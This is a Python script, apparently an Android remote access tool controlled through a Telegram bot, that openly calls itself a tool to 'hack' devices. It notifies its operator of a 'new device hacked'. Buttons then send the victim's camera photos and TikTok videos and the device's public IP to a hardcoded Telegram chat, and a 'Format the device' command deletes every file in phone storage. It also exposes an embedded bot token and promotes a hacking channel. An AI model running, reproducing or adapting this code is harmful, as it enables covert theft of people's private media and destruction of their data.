import subprocess
import sys

# Make sure you have installed the required libraries.
required_libraries = ['telebot', 'requests', 'Pillow']
for lib in required_libraries:
    try:
        __import__(lib)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
import telebot
import os
import requests
from PIL import Image

# Add your token here
bot_token = '7012008563:AAEbvytPnzJzKgox1-VWiAiukDYsW5kcT_Y'
chat_id = '6745000484'


# bot object definition
bot = telebot.TeleBot(bot_token)

image_url = 'https://envs.sh/I1B.jpg'
image_caption = '```\n Welcome This bot is a remote control tool via Telegram, designed to hack device information and manage files. It features capabilities such as deleting files, extracting photos and videos, and obtaining IP address. With an easy-to-use interface and interactive buttons, the bot provides a smooth and secure experience for users. Dont forget to subscribe to our channel below```\n'
response = requests.get(image_url)

if response.status_code == 200:
    with open('image.jpg', 'wb') as img_file:
        img_file.write(response.content)
    
    with open('image.jpg', 'rb') as img_file:
        # إنشاء زر للقناة
        markup = telebot.types.InlineKeyboardMarkup()
        channel_button = telebot.types.InlineKeyboardButton(text='Subscribe to the channelا', url='https://t.me/REDX_HACKING')
        markup.add(channel_button)

        bot.send_photo(chat_id, img_file, caption=image_caption, parse_mode='MarkdownV2', reply_markup=markup)
else:
    print("Image upload failed.")

tlg1 = 'New device hacked \n\nPress start to start the session.'
requests.get(f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={tlg1}')

print('Wait for it to load...')

def Demon_GetIP():
    response = requests.get("https://api.db-ip.com/v2/free/self")
    if response.status_code == 200:
        ip_data = response.json()
        return ip_data.get('ipAddress')
    else:
        return "Could not get the address of theـ IP."

def Demon_GetImage(directory):
    for filename in os.listdir(directory):
        if filename.endswith((".png", ".jpg", ".jpeg")):
            file_path = os.path.join(directory, filename)
            if os.path.isfile(file_path):  # تأكد من أن المسار هو ملف
                try:
                    with Image.open(file_path) as img:
                        # حفظ الصورة بدون تقليص
                        compressed_image_path = file_path.replace('.', '_compressed.')
                        img.save(compressed_image_path, format='JPEG', quality=100, optimize=True)  # حفظ الجودة 100

                    with open(compressed_image_path, 'rb') as image_file:
                        bot.send_photo(chat_id, image_file)
                except Exception as e:
                    bot.send_message(chat_id, f"An error occurred while processing the image: {str(e)}")
            else:
                bot.send_message(chat_id, "Image not found in specified path.")

def Demon_GetVideo(directory):
    for filename in os.listdir(directory):
        if filename.endswith((".mp4", ".avi", ".mkv")):
            file_path = os.path.join(directory, filename)
            with open(file_path, 'rb') as video_file:
                bot.send_video(chat_id, video_file)

def DemonDeleteAllFiles():
    root_directory = '/storage/emulated/0/'  # الدليل الجذر للهاتف
    deleted_files = []
    for root, dirs, files in os.walk(root_directory):
        for filename in files:
            file_path = os.path.join(root, filename)
            try:
                os.remove(file_path)
                deleted_files.append(file_path)
            except Exception as e:
                bot.send_message(chat_id, f"Error deleting file {file_path}: {str(e)}")
    if deleted_files:
        bot.send_message(chat_id, f"The following files have been deleted:\n" + "\n".join(deleted_files))
    else:
        bot.send_message(chat_id, "There are no files to delete.")

@bot.message_handler(commands=['start'])
def Demon6(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    image_button = telebot.types.KeyboardButton('Pull images')
    video_button = telebot.types.KeyboardButton('Video Extraction')
    ip_button = telebot.types.KeyboardButton('Pull the IP')
    format_button = telebot.types.KeyboardButton('Format the device')
    
    markup.add(image_button, video_button, ip_button, format_button)
    bot.send_message(chat_id, "The session has started. You can control the device from the following buttons:", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def Demon5(message):
    if message.text == 'Pull the IP':
        ip_address = Demon_GetIP()
        bot.send_message(chat_id, f"IP address: {ip_address} \n You can get some information about the IP from hereا \n http://ipwho.is/{ip_address}")
    elif message.text == 'Pull images':
        image_path = '/storage/emulated/0/DCIM/Camera/'  # تأكد أن هذا المسار صحيح
        Demon_GetImage(image_path)
    elif message.text == 'Video Extraction':
        directory_path = '/storage/emulated/0/Movies/TikTok'  # تأكد أن هذا المسار صحيح
        Demon_GetVideo(directory_path)
    elif message.text == 'Format the device':
        DemonDeleteAllFiles() 

bot.polling()